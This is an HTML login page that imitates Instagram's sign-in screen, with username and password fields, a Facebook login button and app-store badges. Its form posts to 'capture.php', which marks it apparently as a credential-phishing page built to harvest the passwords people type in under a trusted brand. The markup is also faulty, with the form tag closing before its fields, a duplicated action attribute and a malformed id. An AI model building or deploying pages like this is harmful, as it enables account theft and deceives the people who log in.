<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Login Form</title>
  <link rel="stylesheet" href="./style.css">
</head>
<body>
  <div class="login-container">
    <h1>Instagram</h1>
    <form action="/path-to-backend-script" action="capture.php" method="POST"></form>
      <ul class="form-list">
        <li>
          <input type="text" placeholder="Phone number, username,or, email" id="email" name="email" required>
        </li>
        <li>
          <input type="password" placeholder="Password" id=""password" name="password" required>
        </li>
        <li>
          <button type="submit" class="login-btn">Log in</button>
        </li>
      </ul>
      <div class="divider">
        <span>OR</span>
      </div>
      <button type="button" class="facebook-login">Log in with Facebook</button>
      <a href="#" class="forgot-password">Forgot password?</a>
    </form>
    <div class="signup-link">
      <p>Don't have an account? <a href="#">Sign up</a></p>
    </div>
    <div class="app-links">
      <p>Get the app.</p>
      <div>
        <img src="google-play-badge.png" alt="Get it on Google Play">
        <img src="microsoft-store-badge.png" alt="Get it from Microsoft">
      </div>
    </div>
  </div>
</body>
</html>
